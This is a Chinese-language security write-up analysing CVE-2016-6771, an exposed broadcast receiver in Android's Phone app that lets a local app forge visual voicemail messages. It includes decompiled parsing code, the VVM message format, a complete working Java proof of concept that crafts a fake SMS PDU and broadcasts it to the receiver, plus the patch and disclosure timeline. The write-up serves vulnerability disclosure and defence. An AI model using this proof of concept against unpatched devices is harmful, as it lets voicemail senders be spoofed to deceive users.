作者：[Xbalien@tsrc](https://security.tencent.com/index.php/blog/msg/110)

谷歌近期对外公布了12月份的安全公告，其中包含腾讯安全平台部金刚(KingKong)团队提交的语音信箱伪造漏洞(CVE-2016-6771)，该漏洞可导致恶意应用进行伪造语音信箱攻击。目前谷歌已经发布补丁，本文将对该漏洞进行分析。

### 漏洞概述

![](https://images.seebug.org/content/images/2016/12/B44A4F2D-C0B8-4AFA-94F7-372A84ED2CBB.png-w331s)

Phone应用中存在一处未受保护的暴露组件`com.android.phone.vvm.omtp.sms.OmtpMessageReceiver`，该组件接收来自外部的Intent,解析承载的VVM协议，构造语音信箱。该漏洞可以被本地恶意应用触发，进行伪造语音信箱攻击。该漏洞属于比较常规的暴露组件问题。

### 漏洞详情

在对AOSP中系统应用进行分析时，发现系统应用TeleService.apk(com.android.phone)存在一处暴露组件，该组件为com.android.phone.vvm.omtp.sms.OmtpMessageReceiver。根据组件名字应该是处理某类消息的组件，回想起以前谷歌出现的短信伪造漏洞，于是决定尝试进行分析，看是否存在该类漏洞。
由于该组件是一个广播接收者，于是分析onReceive回调函数处理逻辑，代码如下：

    
    
     public void onReceive(Context context, Intent intent) {
            this.mContext = context;
            this.mPhoneAccount = PhoneUtils.makePstnPhoneAccountHandle(intent.getExtras().getInt("phone"));
            if(this.mPhoneAccount == null) {
                Log.w("OmtpMessageReceiver", "Received message for null phone account");
                return;
            }
            if(!VisualVoicemailSettingsUtil.isVisualVoicemailEnabled(this.mContext, this.mPhoneAccount)) {
                Log.v("OmtpMessageReceiver", "Received vvm message for disabled vvm source.");
                return;
            }
            //开始解析intent，将intent承载的额外数据还原为SmsMessage（短信消息）
            SmsMessage[] v5 = Telephony$Sms$Intents.getMessagesFromIntent(intent);
            StringBuilder v3 = new StringBuilder();
            int v0;
            //把短信消息的body提取出来并合并
            for(v0 = 0; v0 < v5.length; ++v0) {
                if(v5[v0].mWrappedSmsMessage != null) {
                    v3.append(v5[v0].getMessageBody());
                }
            }
            //通过OmtpSmsParser.parse对短息消息的body（vvm协议）进行解析封装到对应处理类
            WrappedMessageData v4 = OmtpSmsParser.parse(v3.toString());
            //根据不同的协议执行不同功能
            if(v4 != null) {
                if(v4.getPrefix() == "//VVM:SYNC:") {
                    SyncMessage v2 = new SyncMessage(v4);
                    Log.v("OmtpMessageReceiver", "Received SYNC sms for " + this.mPhoneAccount.getId() + " with event" + v2.getSyncTriggerEvent());
                    LocalLogHelper.log("OmtpMessageReceiver", "Received SYNC sms for " + this.mPhoneAccount.getId() + " with event" + v2.getSyncTriggerEvent());
                    this.processSync(v2);
                }
                else if(v4.getPrefix() == "//VVM:STATUS:") {
                    Log.v("OmtpMessageReceiver", "Received STATUS sms for " + this.mPhoneAccount.getId());
                    LocalLogHelper.log("OmtpMessageReceiver", "Received Status sms for " + this.mPhoneAccount.getId());
                    this.updateSource(new StatusMessage(v4));
                }
                else {
                    Log.e("OmtpMessageReceiver", "This should never have happened");
                }
            }
        }

  1. 当intent承载的额外数据phone为存在的PhoneAccount且isVisualVoicemailEnabled的时候，会进入vvm协议的解析流程；
  2. 解析流程中首先通过TelephonyIntents.getMessagesFromIntent，把intent里承载的额外数据构造成SmsMessage，通过查看对应处理方法,可以知道intent承载的额外数据可以是3gpp短信消息结构；

    
    
    public static SmsMessage[] getMessagesFromIntent(Intent intent) {
        Object[] messages;
        try {
            //提取pdus原始数据
            messages = (Object[]) intent.getSerializableExtra("pdus");
        }
        catch (ClassCastException e) {
            Rlog.e(TAG, "getMessagesFromIntent: " + e);
            return null;
        }
        if (messages == null) {
            Rlog.e(TAG, "pdus does not exist in the intent");
            return null;
        }
        //获取短消息格式类型
        String format = intent.getStringExtra("format");
        int subId = intent.getIntExtra(PhoneConstants.SUBSCRIPTION_KEY,
        SubscriptionManager.getDefaultSmsSubscriptionId());
        Rlog.v(TAG, " getMessagesFromIntent sub_id : " + subId);
        int pduCount = messages.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        //构造短信消息
        for (int i = 0; i < pduCount; i++) {
            byte[] pdu = (byte[]) messages[i];
            msgs[i] = SmsMessage.createFromPdu(pdu, format);
            msgs[i].setSubId(subId);
        }
        return msgs;
    }

3.从短信消息结构中提取出body部分，交由OmtpSmsParser.parse解析，流程如下：

    
    
    package com.android.phone.vvm.omtp.sms;
    import android.util.ArrayMap;
    import android.util.Log;
    import java.util.Map;
    public class OmtpSmsParser {
        private static String TAG;
        static {
            OmtpSmsParser.TAG = "OmtpSmsParser";
        }
        public OmtpSmsParser() {
            super();
        }
        public static WrappedMessageData parse(String smsBody) {
            WrappedMessageData v4 = null;
            if(smsBody == null) {
                return v4;
            }
            WrappedMessageData v0 = null;
            //短息消息需要满足前缀
            if(smsBody.startsWith("//VVM:SYNC:")) {
                v0 = new WrappedMessageData("//VVM:SYNC:", OmtpSmsParser.parseSmsBody(smsBody.substring(
                        "//VVM:SYNC:".length())));
                if(v0.extractString("ev") == null) {
                    Log.e(OmtpSmsParser.TAG, "Missing mandatory field: ev");
                    return v4;
                }
            }
            else if(smsBody.startsWith("//VVM:STATUS:")) {
                v0 = new WrappedMessageData("//VVM:STATUS:", OmtpSmsParser.parseSmsBody(smsBody.substring(
                        "//VVM:STATUS:".length())));
            }
            return v0;
        }
        //前缀之后需要满足的消息结构
        private static Map parseSmsBody(String message) {
            ArrayMap v3 = new ArrayMap();
            String[] v0 = message.split(";");
            int v6 = v0.length;
            int v4;
            for(v4 = 0; v4 < v6; ++v4) {
                String[] v2 = v0[v4].split("=");
                if(v2.length == 2) {
                    ((Map)v3).put(v2[0].trim(), v2[1].trim());
                }
            }
            return ((Map)v3);
        }
    }

通过分析解析流程，可以知道vvm协议由//VVM:STATUS或者//VVM:SYNC开头，后面有多个字段，由“；”分号作为分割，“=”等号作为键值对，通过分析StatusMessage(v4)，SyncMessage(v4)的构造函数

    
    
    public SyncMessage(WrappedMessageData wrappedData) {
            super();
            this.mSyncTriggerEvent = wrappedData.extractString("ev");
            this.mMessageId = wrappedData.extractString("id");
            this.mMessageLength = wrappedData.extractInteger("l");
            this.mContentType = wrappedData.extractString("t");
            this.mSender = wrappedData.extractString("s");
            this.mNewMessageCount = wrappedData.extractInteger("c");
            this.mMsgTimeMillis = wrappedData.extractTime("dt");
        }
    
    public StatusMessage(WrappedMessageData wrappedData) {
            super();
            this.mProvisioningStatus = wrappedData.extractString("st");
            this.mStatusReturnCode = wrappedData.extractString("rc");
            this.mSubscriptionUrl = wrappedData.extractString("rs");
            this.mServerAddress = wrappedData.extractString("srv");
            this.mTuiAccessNumber = wrappedData.extractString("tui");
            this.mClientSmsDestinationNumber = wrappedData.extractString("dn");
            this.mImapPort = wrappedData.extractString("ipt");
            this.mImapUserName = wrappedData.extractString("u");
            this.mImapPassword = wrappedData.extractString("pw");
            this.mSmtpPort = wrappedData.extractString("spt");
            this.mSmtpUserName = wrappedData.extractString("smtp_u");
            this.mSmtpPassword = wrappedData.extractString("smtp_pw");
        }

可以知道，程序要解析vvm协议如下：

    
    
    //VVM:STATUS:st=xxx;rc=0;rs=xxx;srv=xxx;tui=xxx;dn=xxx;ipt=xxx;u=xxx;pw=xxx;spt=xxx;smtp_u=xxx;smtp_pw=xxx
    //VVM:SYNC:ev=xxx;id=xxx;l=xxx;t=xxx;s=xxx;c=xxx;dt=xxx;srv=xxx;ipt=xxx;u=xxx;pw=xxx

4.根据vvm协议，构造不同的数据结构，最后根据不同的协议执行不同的流程。
5.在测试过程中，发现//VVM:SYNC可以指定来源，伪造任意号码。而如果要在进入可视化语音邮箱界面，点击播放语音时能够产生语音的下载，需要事先有//VVM:STATUS协议，这样在点击播放时才会去对应的服务器进行账号登录，获取数据（具体的测试本人并深入去测试，如有错误望大家指正），相关vvm协议可以参考资料[1]和[2]。

#### POC如下：

构造一个短信消息结构，其中body为符合相关解析流程的//VVM协议，就可以让OmtpMessageReceiver根据外部intent承载的额外数据构造伪造的语音信箱。其中，较早版本的Android系统曾经出现过伪造短信的漏洞，直接利用那段代码[3]，构造短信消息可以。

    
    
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            statusButton = (Button) findViewById(R.id.status_btn);
            syncButton = (Button) findViewById(R.id.sync_btn);
    
            statusButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    //VVM:STATUS消息
                    createFakeSms(MainActivity.this, "100000", "//VVM:STATUS:st=R;rc=0;srv=vvm.tmomail.net;ipt=143;u=0000000000@vms.eng.t-mobile.com;pw=BOQ8CAzzNcu;lang=1|2|3|4;g_len=180;vs_len=10;pw_len=4-9");
                }
            });
    
            syncButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    //VVM:SYNC消息
                    createFakeSms(MainActivity.this, "100000", "//VVM:SYNC:ev=NM;c=1;t=v;s=12345678;dt=09/16/2016 10:53 -0400;l=7;srv=vvm.tmomail.net;ipt=143;u=0000000000@vms.eng.t-mobile.com;pw=BOQ8CAzzNcu;");
                }
            });
        }
    
        //构造短信消息
        private static void createFakeSms(Context context, String sender,
                                          String body) {
            byte[] pdu = null;
            byte[] scBytes = PhoneNumberUtils
                    .networkPortionToCalledPartyBCD("0000000000");
            byte[] senderBytes = PhoneNumberUtils
                    .networkPortionToCalledPartyBCD(sender);
            int lsmcs = scBytes.length;
            byte[] dateBytes = new byte[7];
            Calendar calendar = new GregorianCalendar();
            dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
            dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
            dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
            dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
            dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
            dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
            dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
                    .get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
            try {
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                bo.write(lsmcs);
                bo.write(scBytes);
                bo.write(0x04);
                bo.write((byte) sender.length());
                bo.write(senderBytes);
                bo.write(0x00);
                bo.write(0x00); // encoding: 0 for default 7bit
                bo.write(dateBytes);
                try {
                    String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
                    Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
                    Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(
                            "stringToGsm7BitPacked", new Class[] { String.class });
                    stringToGsm7BitPacked.setAccessible(true);
                    byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null,
                            body);
                    bo.write(bodybytes);
                } catch (Exception e) {
                }
    
                pdu = bo.toByteArray();
            } catch (IOException e) {
            }
            //构造待发送的intent
            Intent intent = new Intent();
            intent.setClassName("com.android.phone",
                    "com.android.phone.vvm.omtp.sms.OmtpMessageReceiver");
            intent.putExtra("phone",0);
            intent.putExtra("pdus", new Object[] { pdu });
            intent.putExtra("format", "3gpp");
            context.sendBroadcast(intent);
        }
    
        private static byte reverseByte(byte b) {
            return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
        }

#### 实际效果

可以伪造语音信箱来源为12345678，欺骗用户

![](https://images.seebug.org/content/images/2016/12/CF798CCE-1CD0-406B-B515-F78B3B8C3094.png-w331s)

### 修复方案

谷歌的修复方案是设置该组件为不导出
https://android.googlesource.com/platform/packages/services/Telephony/+/a39ff9526aee6f2ea4f6e02412db7b33d486fd7d

### 时间线

  * 2016.09.17 提交漏洞报告至 Android issue Tracker
  * 2016.10.04 确认漏洞，ANDROID-31566390
  * 2016.10.27 分配CVE-2016-6771 
  * 2016.12.06 [谷歌公告](http://source.android.com/security/bulletin/2016-12-01.html)

### 参考

[1].https://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/

[2].http://www.gsma.com/newsroom/wp-content/uploads/2012/07/OMTP_VVM_Specification13.pdf

[3].(http://stackoverflow.com/questions/12335642/create-pdu-for-android-that-works-with-smsmessage-createfrompdu-gsm-3gpp)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/141/>

